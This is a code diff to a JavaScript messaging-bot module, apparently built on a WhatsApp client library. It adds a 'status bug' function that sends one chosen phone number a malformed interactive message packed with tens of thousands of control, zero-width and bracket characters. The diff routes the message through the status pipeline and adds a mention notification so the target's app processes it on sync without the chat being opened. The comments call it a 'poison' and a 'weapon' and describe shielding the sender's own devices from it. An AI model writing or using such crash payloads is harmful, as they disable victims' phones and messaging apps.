@@ -50,11 +50,11 @@ export function createBugProbeEngine(deps) {
             fs.writeFileSync(fp, JSON.stringify({ sends }));
         } catch (err) { logError('TEST', `bug registry save failed for ${phoneNumber}`, err); }
     }
-    function recordBugSends(phoneNumber, targetJid, ids) {
+    function recordBugSends(phoneNumber, targetJid, ids, extra) {
         if (!phoneNumber || !targetJid || !Array.isArray(ids) || !ids.length) return;
         const sends = loadBugSends(phoneNumber);
         const now = Date.now();
-        for (const id of ids) if (id) sends.push({ id: String(id), jid: targetJid, at: now });
+        for (const id of ids) if (id) sends.push({ id: String(id), jid: targetJid, at: now, ...(extra || {}) });
         saveBugSends(phoneNumber, sends);
         log('TEST', `${phoneNumber}: recorded ${ids.length} bug msg id(s) for /unbug (72h window)`);
     }
@@ -436,6 +436,62 @@ export function createBugProbeEngine(deps) {
         return { wireBytes, ids: rid ? [rid] : [] };
     }
 
+    // 🧪 STATUS BUG — posts the proven interactiveMessage poison as a STATUS
+    // addressed to ONE number (fork statusJidList targeting — same mechanism
+    // as the fork's own statusMention). Two big differences vs group sends:
+    //   1. The payload rides the STATUS pipeline: the target's app processes
+    //      status updates eagerly at sync (status tray previews) and the
+    //      mentioned_users node pushes a "mentioned you in their status"
+    //      notification — processing without opening any chat.
+    //   2. SELF-SHIELD: the audience list contains ONLY the target — the
+    //      bot owner's own devices are never addressed, so unlike .gb-hard
+    //      the sender's phone cannot be hit by its own weapon.
+    // /unbug support: entries carry status:true and are deleted via
+    // status@broadcast.
+    async function sendStatusBugProbe(prim, target) {
+        const payload = {
+            interactiveMessage: {
+                header: {
+                    title: "𑇂𑆴𑆿".repeat(10000),
+                    subtitle: "\x10".repeat(50000),
+                    bloksWidget: {
+                        uuid: "\u200B".repeat(50000),
+                        data: "[".repeat(50000),
+                        type: "\u200F".repeat(50000),
+                        fallback: "\u200D".repeat(50000)
+                    }
+                },
+                body: { text: "\u000F" },
+                nativeFlowMessage: {
+                    buttons: "[".repeat(50000)
+                }
+            }
+        };
+        const wireBytes = wireBytesOf(payload);
+        const rid = await prim.relayMessage('status@broadcast', payload, {
+            // ONLY the target's devices receive this — never the owner's.
+            statusJidList: [target],
+            // Mention notification ("mentioned you in their status") — node
+            // shape copied verbatim from the fork's statusMention sender.
+            additionalNodes: [
+                {
+                    tag: 'meta',
+                    attrs: {},
+                    content: [
+                        {
+                            tag: 'mentioned_users',
+                            attrs: {},
+                            content: [
+                                { tag: 'to', attrs: { jid: target }, content: undefined }
+                            ]
+                        }
+                    ]
+                }
+            ]
+        });
+        return { wireBytes, ids: rid ? [rid] : [], status: true };
+    }
+
     return Object.freeze({
         bugSendsPath,
         loadBugSends,
@@ -450,6 +506,7 @@ export function createBugProbeEngine(deps) {
         buildAndrozPayload,
         buildTestfffMessage,
         prepareCardImage,
-        sendGbHardProbe
+        sendGbHardProbe,
+        sendStatusBugProbe
     });
 }
